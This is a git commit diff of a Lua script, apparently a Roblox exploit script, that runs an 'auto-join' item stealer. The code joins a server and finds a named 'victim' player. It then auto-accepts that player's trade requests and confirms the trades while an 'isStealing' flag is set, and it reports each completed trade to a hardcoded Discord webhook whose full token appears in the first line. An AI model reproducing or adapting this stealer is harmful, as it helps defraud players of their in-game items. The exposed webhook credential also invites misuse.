2126eaa5ea90a99ef766fbffb4345292abcfc951
catsakenkeysystem <umidk1837@gmail.com>
2026-03-31 20:10:17 +0100

    Update qu.lua

--- qu.lua
+++ qu.lua
@@ -1,3 +1,4 @@
+
 local AJwebhook = "https://discord.com/api/webhooks/1488553917296935006/qjKUS4ez4-_ozhjybmbzb66EbPc_7DbRTRO6Oi9IAjeSup2A5oX9bJxfgdN5HXhD7nLf"
 local IsKicked = true
 game:GetService("GuiService").ErrorMessageChanged:Connect(function(text)
@@ -58,90 +59,91 @@ local filename = "lizardautojoindata.json"
 local isStealing = false
 local autjoindata = isfile(filename) and readfile(filename)
 local victimuserid
-if autjoindata then
-    local json = HttpService:JSONDecode(autjoindata)
-    if game.JobId == json.JobId then
-        local victim
-        for i, plr in pairs(game:GetService("Players"):GetPlayers()) do
-            if plr.UserId == json.UserId then
-                victim = plr
-                break
-            end
-        end
-        if victim then
-            local vname = victim.Name
-	        victimuserid = victim.UserId
-            local VictimIsTrading
-            local StealerIsTrading
-            isStealing = true
-            while game:GetService("Players"):FindFirstChild(vname) and isStealing and task.wait(1) do
-                local tradeframe = Tradelayer:FindFirstChild("IncomingTradeRequestFrame")
-                warn("Waiting", tradeframe)
-                if tradeframe then
-                    if tradeframe:WaitForChild("TextLabel").Text:match("(.+) would like to Trade") == vname then
-                        warn("accepting trade from " .. vname)
-                        firesignal(tradeframe.ButtonAccept.MouseButton1Click)
-                    else
-                        print("who's this?")
-                        firesignal(tradeframe.ButtonDeny.MouseButton1Click)
-                    end
+spawn(function()
+    if autjoindata then
+        local json = HttpService:JSONDecode(autjoindata)
+        if game.JobId == json.JobId then
+            local victim
+            for i, plr in pairs(game:GetService("Players"):GetPlayers()) do
+                if plr.UserId == json.UserId then
+                    victim = plr
+                    break
                 end
-                local tradinggui = Tradelayer:FindFirstChild("TradeAnchorFrame")
-                if tradinggui then
-                    warn("In trade", tradinggui)
-                    VictimIsTrading = victim:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
-                    StealerIsTrading = LocalPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
-                    while VictimIsTrading.Value and StealerIsTrading.Value and task.wait(1) do
-                        warn("waiting for accept")
-                        local acceptbutton = tradinggui:FindFirstChild("TradeFrame") and tradinggui.TradeFrame:FindFirstChild("ButtonAccept") and
-                            tradinggui.TradeFrame.ButtonAccept:FindFirstChild("ButtonTop")
-                        if acceptbutton and acceptbutton.TextLabel.Text ~= "Unaccept" then
-                            firesignal(acceptbutton.MouseButton1Click)
-                            task.wait(1.5)
+            end
+            if victim then
+                local vname = victim.Name
+                victimuserid = victim.UserId
+                local VictimIsTrading
+                local StealerIsTrading
+                isStealing = true
+
+                while game:GetService("Players"):FindFirstChild(vname) and isStealing and task.wait(1) do
+                    local tradeframe = Tradelayer:FindFirstChild("IncomingTradeRequestFrame")
+                    warn("Waiting", tradeframe)
+                    if tradeframe then
+                        if tradeframe:WaitForChild("TextLabel").Text:match("(.+) would like to Trade") == vname then
+                            warn("accepting trade from " .. vname)
+                            firesignal(tradeframe.ButtonAccept.MouseButton1Click)
+                        else
+                            print("who's this?")
+                            firesignal(tradeframe.ButtonDeny.MouseButton1Click)
                         end
                     end
-                    warn("done")
-                    spawn(function()
-                        local Body = game:GetService("HttpService"):JSONEncode({
-                            content = "Auto-Join completed a trade: " .. string.format("https://discord.com/channels/%s/%s/%s", json.guild_id, json.channel_id, json.message_id)
-                        })
-                        http.request({
-                            Url = AJwebhook,
-                            Method = "POST",
-                            Headers = {
-                                ["content-type"] = "application/json"
-                            },
-                            Body = Body
-                        })
-                    end)
+                    local tradinggui = Tradelayer:FindFirstChild("TradeAnchorFrame")
+                    if tradinggui then
+                        warn("In trade", tradinggui)
+                        VictimIsTrading = victim:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
+                        StealerIsTrading = LocalPlayer:WaitForChild("TradeConfig", math.huge):WaitForChild("IsTrading", math.huge)
+                        while VictimIsTrading.Value and StealerIsTrading.Value and task.wait(1) do
+                            warn("waiting for accept")
+                            local acceptbutton = tradinggui:FindFirstChild("TradeFrame") and tradinggui.TradeFrame:FindFirstChild("ButtonAccept") and
+                                tradinggui.TradeFrame.ButtonAccept:FindFirstChild("ButtonTop")
+                            if acceptbutton and acceptbutton.TextLabel.Text ~= "Unaccept" then
+                                firesignal(acceptbutton.MouseButton1Click)
+                                task.wait(1.5)
+                            end
+                        end
+                        warn("done")
+                        spawn(function()
+                            local Body = game:GetService("HttpService"):JSONEncode({
+                                content = "Auto-Join completed a trade: " .. string.format("https://discord.com/channels/%s/%s/%s", json.guild_id, json.channel_id, json.message_id)
+                            })
+                            http.request({
+                                Url = AJwebhook,
+                                Method = "POST",
+                                Headers = {
+                                    ["content-type"] = "application/json"
+                                },
+                                Body = Body
+                            })
+                        end)
+                    end
                 end
+            else
+                warn("player not found yet")
             end
         else
-            warn("player not found yet")
+            local Body = game:GetService("HttpService"):JSONEncode({
+                content = "Auto-Join bot running on " .. LocalPlayer.Name
+            })
+            http.request({
+                Url = AJwebhook,
+                Method = "POST",
+                Headers = {
+                    ["content-type"] = "application/json"
+                },
+                Body = Body
+            })
+            warn("just started")
         end
-    else
-        local Body = game:GetService("HttpService"):JSONEncode({
-            content = "Auto-Join bot running on " .. LocalPlayer.Name
-        })
-        http.request({
-            Url = AJwebhook,
-            Method = "POST",
-            Headers = {
-                ["content-type"] = "application/json"
-            },
-            Body = Body
-        })
-        warn("just started")
     end
-end
-repeat task.wait() until not isStealing
+end)
 
 ws.OnMessage:Connect(function(msg)
     local json = HttpService:JSONDecode(msg)
     if not json then return warn("not json") end
     local jobId = json.JobId
     local userid = json.UserId
-    warn(userid, json.AllItemsTraded, victimuserid)
     if userid and json.AllItemsTraded and userid == victimuserid then
         isStealing = false
         spawn(function()
@@ -160,6 +162,7 @@ ws.OnMessage:Connect(function(msg)
         return
     end
     if not jobId or not userid then return warn("missing keys") end
+    repeat task.wait() until not isStealing
     writefile(filename, msg)
     spawn(function()
         local Body = game:GetService("HttpService"):JSONEncode({
